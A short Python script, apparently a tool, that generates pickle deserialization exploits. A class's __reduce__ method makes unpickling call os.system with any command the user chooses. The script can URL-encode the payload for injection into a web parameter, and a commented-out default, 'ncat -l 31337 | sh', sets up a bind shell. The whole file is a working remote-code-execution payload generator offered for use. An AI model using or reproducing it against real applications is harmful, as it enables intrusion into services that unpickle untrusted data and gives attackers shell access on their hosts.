""" Python3 code to generate Pickle exploits """
#!/usr/bin/env python3

from os import system
from urllib.parse import urlencode
import pickle

#COMMAND_STR = "ncat -l 31337 | sh"
COMMAND_STR = "echo 'Owned!'"

HELP_MESSAGE = """USAGE:
    python3 ./pickle_exploit.py [ OPTIONS ]

OPTIONS:
    help        print this help message

    test        unpickle the payload (careful!)
    OR
    url         url-encode payload (sploit=PAYLOAD)

    cmd         read stdin for a command string
"""

class PickleExploitFactory:
    """ Generates exploits """
    def __init__(self, cmd):
        self.cucumber = cmd

    def __reduce__(self):
        return (system, (self.cucumber,))

if __name__ == '__main__':
    from sys import argv, exit

    if "help" in argv:
        print(HELP_MESSAGE)
        exit(0)

    test = "test" in argv
    url = "url" in argv

    if url and test:
        print(HELP_MESSAGE)
        exit(1)
    
    cmd = input("Enter a command to pickle: ") if "cmd" in argv else COMMAND_STR

    instance = PickleExploitFactory(cmd)
    bs = pickle.dumps(instance)

    if test:
        pickle.loads(bs)
    elif url:   
        var = input("Enter a variable name for URLEncoding: ")
        print(urlencode({var:bs})) 
    else:
        print(bs)
